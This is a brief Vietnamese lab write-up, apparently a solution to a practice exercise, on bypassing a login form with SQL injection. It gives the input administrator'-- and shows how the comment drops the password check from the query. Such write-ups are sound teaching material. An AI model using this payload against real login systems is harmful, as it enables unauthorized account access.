<img width="600" height="367" alt="image" src="https://github.com/user-attachments/assets/5615981e-9570-4e98-9ba0-e1a48801e52f" />

<img width="600" height="791" alt="image" src="https://github.com/user-attachments/assets/0bd4b49c-2678-4d82-bc5d-7a9ef5fbf208" />

Bài lab yêu cầu login thành công dưới tên người dùng **administrator**  

Ta thực hiện sqli bằng chuỗi input:

```SQL
administrator'--
```

Nhập pass bất kì, ví dụ `123`

Khi đó câu truy vấn sẽ thành:
```SQL
SELECT * FROM users WHERE username = 'administrator' -- AND password = '123'
```
Phần password sẽ bị coi là Comment và ko được đối chiếu, nên câu lệnh sẽ chỉ còn lại:
```SQL
SELECT * FROM users WHERE username = 'administrator' 
```
Login thành công!

<img width="600" height="404" alt="image" src="https://github.com/user-attachments/assets/86c53d85-eed4-46f3-9ab1-42bbf8c0957c" />

<img width="600" height="578" alt="image" src="https://github.com/user-attachments/assets/6e3a957f-8637-4055-8559-3c1583d2e6ba" />
